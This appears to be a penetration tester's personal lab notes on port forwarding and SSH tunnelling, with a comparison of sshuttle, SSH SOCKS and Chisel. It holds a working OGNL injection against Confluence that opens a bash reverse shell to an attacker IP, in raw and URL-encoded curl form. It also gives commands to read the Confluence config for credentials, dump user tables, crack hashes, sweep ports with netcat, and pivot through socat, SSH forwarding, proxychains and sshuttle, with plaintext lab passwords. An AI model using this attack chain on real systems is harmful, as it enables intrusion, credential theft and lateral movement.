## Comparison Table

| Tool     | Layer       | Setup            | Needs SSH Server | Proxy Type      | Use Case/Strengths                                                                                                          |
| -------- | ----------- | ---------------- | ---------------- | --------------- | --------------------------------------------------------------------------------------------------------------------------- |
| sshuttle | IP/TCP      | Simple           | Yes              | Transparent     | Easy VPN-like tunneling, no server root needed[](https://www.hackingarticles.in/port-forwarding-tunnelling-cheatsheet/)​    |
| SSH -D   | SOCKS Proxy | Standard/OpenSSH | Yes              | Manual (SOCKS)  | App-specific tunneling, secure and reliable[](https://www.digitalocean.com/community/tutorials/ssh-port-forwarding)​        |
| Chisel   | TCP/UDP     | Go Binary        | No               | SOCKS5 built-in | Flexible userland tunnels, HTTP/WebSocket, no SSH[](https://trojand.com/cheatsheet/Network/Connections/SSH_Tunneling.html)​ |

## PORT FORWARING WITH SOCAT
#port-forwarding
```
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
#### OGNL INJECTION
#injection
```

/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/


#EXPLOIT ACTUAL ENCODING 

curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

#### CONFIGURATION FILE
```
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
```

#### POSTGRESQL CONNECTION
#db #postgresql
```
psql -h 192.168.50.63 -p 2345 -U postgres


#LISTING DATABASES
\l

#SELECTING DATABASE
\c confluence

#printing everything on that database
select * from cwd_user;
```

#### CRACKING POSTGRESQL PASSWORD OF USERS 
#cracking
```
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```

```
ssh database_admin@192.168.50.63 -p2222
```

**DEPENDENCY** = need a tty shell to ssh 
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

```
ssh database_admin@10.4.50.215
```

###### ENUMERATION AFTER MOVING INSIDE
```
ip addr
```

```
ip route
```

**WITHOUT ANY TOOLS FINDING OPEN PORTS**
#no-tool
```
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

#syntax
```
[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT
```

## SSH TUNNELING

***DEPENDENCY*** = EVERY SSH CONNECTION NEEDS TTY SESSION 

1. **SSH LOCAL PORT FORWARDING**
2. **SSH DYNAMIC PORT FORWARDING**
3. **SSH REMOTE PORT FORWARDING**
4. **SSH REMOTE DYNAMIC PORT FORWARDING**

#### SSH LOCAL PORT FORWARDING

#port-forwarding 
```
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

**VERIFICAITON**
```
ss -ntplu
```

```
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

```
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
```
## SSH DYNAMIC PORT FORWARING

**DEPENDENCY** = NEEDS PROXYCHAINS TO WORK

#port-forwarding 
```
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

```
tail /etc/proxychains4.conf
```

***EVERY PROGRAM SHOULD RUN VIA PROXYCHAINS TO SEND THAT TRAFFIC TO TUNNEL***
```
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

```
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```
## SSH REMOTE PORT FORWARDING

**WE ARE SERVER HERE SO WE NEED TO CONFIGURE SSH SERVER ON ATTACKER HOST**
```
sudo systemctl start ssh
```

```
sudo ss -ntplu
```

#port-forwarding 
```
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

```
ss -ntplu
```

```
psql -h 127.0.0.1 -p 2345 -U postgres
```
## SSH REMOTE DYNAMIC PORT FORWARDING 

**DEPENDENCY** = NEEDS PROXYCHAINS TO WORK
**DEPENDENCY** = NEEDS OPENSSH 7.6 OR ABOVE ON CLIENT (TARGET)

#port-forwarding 
```
ssh -N -R 9998 kali@192.168.118.4
```

```
sudo ss -ntplu
```

```
tail /etc/proxychains4.conf
```

PROXYCHAINS ARE SLOW , SHORTEN YOUR SCAN TO SPEED UP THE SCAN 
CONFIGURATION FOR PROXYCHAINS TIMEOUT WILL ALSO SPEED UP THE PROCESS
```
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```
## SSHUTTLE
```
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

**DISCRIPTION** : *WHATEVER DATA I SEND ON THESE TWO NETWORKS SUBNETS SHOULD GO TO THE SSH SERVER I AM CONNECTING ON , WHICH IS IN MY CASE DATABSE_ADMIN USER ON 192 NETWORK* 

*0/0 MEANS ALL TRAFFIC* 
```
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

```
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

